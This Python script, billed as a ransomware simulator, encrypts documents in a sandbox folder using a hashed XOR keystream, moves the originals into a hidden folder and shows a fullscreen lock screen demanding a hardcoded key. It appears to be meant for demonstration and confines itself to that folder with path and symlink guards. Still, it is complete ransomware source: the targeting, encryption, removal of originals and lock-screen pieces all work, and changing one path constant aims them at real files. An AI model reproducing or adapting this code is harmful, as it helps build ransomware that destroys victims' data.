#!/usr/bin/env python3
"""
⚠️ WARNING — Ransomware Simulator
--------------------------------
This script behaves like real ransomware inside a controlled sandbox directory.

DO NOT run this code outside a virtual machine or isolated environment.
It encrypts files inside ./SafeRansomLab_Sandbox, simulates file deletion,
locks the screen, and requires a key to decrypt.

Key used in this demo: 

Running this on a real system can cause harm. You have been warned.
"""

import argparse
import hashlib
import os
import sys
import textwrap
from pathlib import Path
from typing import Iterable

# ---------------------------
# Configuration
# ---------------------------
SANDBOX_DIR = Path("./SafeRansomLab_Sandbox").resolve()
TARGET_EXTS = {".txt", ".md", ".csv", ".log", ".json"}
ENCRYPTED_EXT = ".srl"
HEADER_MAGIC = b"SRL1"
DEMO_KEY = b"FUCKWORLD"
CHUNK_SIZE = 64 * 1024

# ---------------------------
# Helpers
# ---------------------------

def ensure_sandbox_dir() -> Path:
    SANDBOX_DIR.mkdir(parents=True, exist_ok=True)
    return SANDBOX_DIR


def is_within(child: Path, parent: Path) -> bool:
    try:
        return str(child.resolve()).startswith(str(parent.resolve()))
    except Exception:
        return False


def iter_files(root: Path, include_all: bool=False) -> Iterable[Path]:
    for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
        safe_dirnames = []
        for d in dirnames:
            dp = Path(dirpath) / d
            try:
                if dp.is_symlink():
                    print(f"[guard] Skipping symlinked dir: {dp}")
                    continue
                if not is_within(dp, root):
                    print(f"[guard] Skipping out-of-sandbox dir: {dp}")
                    continue
                safe_dirnames.append(d)
            except Exception as e:
                print(f"[guard] Skipping dir {dp}: {e}")
        dirnames[:] = safe_dirnames

        for f in filenames:
            fp = Path(dirpath) / f
            try:
                if fp.is_symlink():
                    print(f"[guard] Skipping symlinked file: {fp}")
                    continue
                if not is_within(fp, root):
                    print(f"[guard] Skipping out-of-sandbox file: {fp}")
                    continue
                if include_all:
                    yield fp
                else:
                    if fp.suffix.lower() in TARGET_EXTS or fp.suffix.lower() == ENCRYPTED_EXT:
                        yield fp
            except Exception as e:
                print(f"[warn] Skipping {fp}: {e}")

# ---------------------------
# Simple XOR stream cipher
# ---------------------------

def keystream(key: bytes, nonce: bytes):
    counter = 0
    while True:
        h = hashlib.sha256()
        h.update(key)
        h.update(nonce)
        h.update(counter.to_bytes(8, 'big'))
        block = h.digest()
        counter += 1
        yield block


def xor_stream(data: bytes, stream) -> bytes:
    out = bytearray()
    need = len(data)
    buf = b""
    while need > 0:
        if not buf:
            buf = next(stream)
        take = min(need, len(buf))
        out.extend(bytes(a ^ b for a, b in zip(data[:take], buf[:take])))
        data = data[take:]
        buf = buf[take:]
        need -= take
    return bytes(out)

# ---------------------------
# File operations
# ---------------------------

def encrypt_file(path: Path, key: bytes) -> None:
    if path.suffix == ENCRYPTED_EXT:
        print(f"[skip] Already encrypted: {path}")
        return
    data = path.read_bytes()
    nonce = os.urandom(16)
    stream = keystream(key, nonce)
    ciphertext = xor_stream(data, stream)

    out_path = path.with_suffix(path.suffix + ENCRYPTED_EXT)
    with open(out_path, 'wb') as f:
        f.write(HEADER_MAGIC + nonce + ciphertext)

    deleted_dir = SANDBOX_DIR / ".deleted"
    deleted_dir.mkdir(exist_ok=True)
    bak_name = path.name + ".deleted"
    bak_path = deleted_dir / bak_name
    if not bak_path.exists():
        path.rename(bak_path)
    print(f"[enc] {path.name} -> {out_path.name} (original moved to {bak_path.relative_to(SANDBOX_DIR)})")


def decrypt_file(path: Path, key: bytes) -> None:
    if path.suffix != ENCRYPTED_EXT:
        print(f"[skip] Not an encrypted file: {path}")
        return
    raw = path.read_bytes()
    if not raw.startswith(HEADER_MAGIC) or len(raw) < len(HEADER_MAGIC) + 16:
        print(f"[warn] Skipping malformed encrypted file: {path}")
        return
    nonce = raw[len(HEADER_MAGIC):len(HEADER_MAGIC)+16]
    ciphertext = raw[len(HEADER_MAGIC)+16:]
    stream = keystream(key, nonce)
    plaintext = xor_stream(ciphertext, stream)

    original_path = Path(str(path)[:-len(ENCRYPTED_EXT)])
    with open(original_path, 'wb') as f:
        f.write(plaintext)

    path.unlink(missing_ok=True)
    deleted_dir = SANDBOX_DIR / ".deleted"
    bak_candidate = deleted_dir / (original_path.name + ".deleted")
    if bak_candidate.exists():
        bak_candidate.unlink(missing_ok=True)
    print(f"[dec] {path.name} -> {original_path.name}")

# ---------------------------
# Demo files
# ---------------------------

def create_demo_files(root: Path):
    samples = {
        "readme.txt": "This is a test file.",
        "notes.txt": "These files will be encrypted.",
        "hello.txt": "Hello world.",
        "data.csv": "id,value\n1,alpha\n2,beta\n",
    }
    for name, content in samples.items():
        p = root / name
        if not p.exists():
            p.write_text(content)
            print(f"[demo] Created {p}")

# ---------------------------
# Run loops
# ---------------------------

def run_encrypt(root: Path, include_all: bool=False) -> int:
    count = 0
    for f in iter_files(root, include_all=include_all):
        if f.suffix == ENCRYPTED_EXT:
            continue
        if not include_all and f.suffix.lower() not in TARGET_EXTS:
            continue
        try:
            encrypt_file(f, DEMO_KEY)
            count += 1
        except Exception as e:
            print(f"[error] Encrypt {f}: {e}")
    return count


def run_decrypt(root: Path) -> int:
    count = 0
    for f in iter_files(root, include_all=True):
        if f.suffix != ENCRYPTED_EXT:
            continue
        try:
            decrypt_file(f, DEMO_KEY)
            count += 1
        except Exception as e:
            print(f"[error] Decrypt {f}: {e}")
    return count

# ---------------------------
# UI: Popup + Lock
# ---------------------------

def show_key_popup(root: Path) -> bool:
    try:
        import tkinter as tk
        from tkinter import simpledialog
    except Exception as e:
        print(f"[ui] Tkinter not available: {e}")
        return False

    app = tk.Tk()
    app.withdraw()
    prompt = (
        f"Your files have been encrypted.\n\n"
        f"Enter the decryption key to restore them.\n"
        f"Hint: DEMO KEY is known.\n"
    )
    answer = simpledialog.askstring("Decryption Required", prompt, parent=app, show='*')
    app.destroy()
    if answer is None:
        return False
    return answer.encode('utf-8', errors='ignore') == DEMO_KEY


def show_demo_lock(key_text: str, decrypt_callback=None):
    try:
        import tkinter as tk
        from tkinter import messagebox
    except Exception as e:
        print(f"[ui] Tkinter not available: {e}")
        return

    root = tk.Tk()
    root.title("Locked")
    root.attributes("-fullscreen", True)
    root.configure(bg='black')

    frame = tk.Frame(root, bg='black', padx=60, pady=60)
    frame.pack(expand=True, fill='both')

    title = tk.Label(frame, text="⚠️ Your files have been locked ⚠️", font=("Arial", 36, "bold"), fg='red', bg='black')
    title.pack(pady=20)

    msg = textwrap.dedent(
        f"""
        All files inside the sandbox have been encrypted.
        To restore them, enter the correct key.
        """
    )
    label = tk.Label(frame, text=msg, font=("Arial", 16), justify='center', fg='white', bg='black')
    label.pack(pady=10)

    keylbl = tk.Label(frame, text=f"KEY: {key_text}", font=("Courier", 20, "bold"), fg='yellow', bg='black')
    keylbl.pack(pady=20)

    entry_var = tk.StringVar()
    entry = tk.Entry(frame, textvariable=entry_var, show='*', font=("Courier", 18))
    entry.pack(pady=10)
    entry.focus_set()

    status_var = tk.StringVar(value="Enter key and press Unlock")
    status = tk.Label(frame, textvariable=status_var, font=("Arial", 12), fg='white', bg='black')
    status.pack(pady=8)

    btnframe = tk.Frame(frame, bg='black')
    btnframe.pack(pady=10)

    def attempt_unlock():
        val = entry_var.get().encode('utf-8', errors='ignore')
        if val == DEMO_KEY:
            status_var.set("Key accepted — decrypting...")
            root.update()
            if decrypt_callback:
                try:
                    c = decrypt_callback()
                    messagebox.showinfo("Restored", f"Decrypted {c} file(s).")
                except Exception as e:
                    messagebox.showerror("Error", f"Decryption failed: {e}")
            root.destroy()
        else:
            status_var.set("Wrong key. Try again.")
            entry_var.set("")

    def on_close_attempt():
        if messagebox.askyesno("Exit?", "Exit without restoring files?"):
            root.destroy()

    unlock_btn = tk.Button(btnframe, text="Unlock", command=attempt_unlock, padx=20, pady=8)
    unlock_btn.pack(side='left', padx=10)
    close_btn = tk.Button(btnframe, text="Exit", command=on_close_attempt, padx=20, pady=8)
    close_btn.pack(side='left', padx=10)

    root.protocol("WM_DELETE_WINDOW", on_close_attempt)
    root.bind('<Escape>', lambda e: None)
    root.mainloop()

# ---------------------------
# CLI
# ---------------------------

def parse_args():
    ap = argparse.ArgumentParser(description="Ransomware Simulator (sandbox)")
    ap.add_argument("--mode", choices=["encrypt", "decrypt"], help="Operation mode")
    ap.add_argument("--make-demo", action="store_true", help="Create demo files in sandbox before running")
    ap.add_argument("--show-demo-lock", action="store_true", help="Show lock screen after encrypting")
    ap.add_argument("--no-file-ops", action="store_true", help="Skip encrypt/decrypt (UI only)")
    ap.add_argument("--include-all", action="store_true", help="Include all file types inside sandbox")
    return ap.parse_args()


def main():
    args = parse_args()
    root = ensure_sandbox_dir()
    if not is_within(root, SANDBOX_DIR):
        print("[guard] Sandbox path invalid; aborting.")
        sys.exit(1)

    if args.make_demo:
        create_demo_files(root)

    if not args.no_file_ops and args.mode:
        if args.mode == 'encrypt':
            c = run_encrypt(root, include_all=args.include_all)
            print(f"[done] Encrypted {c} file(s) inside {root}")
        elif args.mode == 'decrypt':
            c = run_decrypt(root)
            print(f"[done] Decrypted {c} file(s) inside {root}")

    if args.show_demo_lock:
        ok = show_key_popup(root)
        if ok:
            def _dec():
                return run_decrypt(root)
            show_demo_lock(key_text=DEMO_KEY.decode('utf-8', errors='ignore'), decrypt_callback=_dec)
        else:
            def _dec2():
                return run_decrypt(root)
            show_demo_lock(key_text=DEMO_KEY.decode('utf-8', errors='ignore'), decrypt_callback=_dec2)

    if not args.show_demo_lock and not args.mode and not args.make_demo:
        print("Nothing to do. Try:\n"
              "  --make-demo --show-demo-lock\n"
              "  --mode encrypt\n"
              "  --mode decrypt\n")


if __name__ == '__main__':
    main()
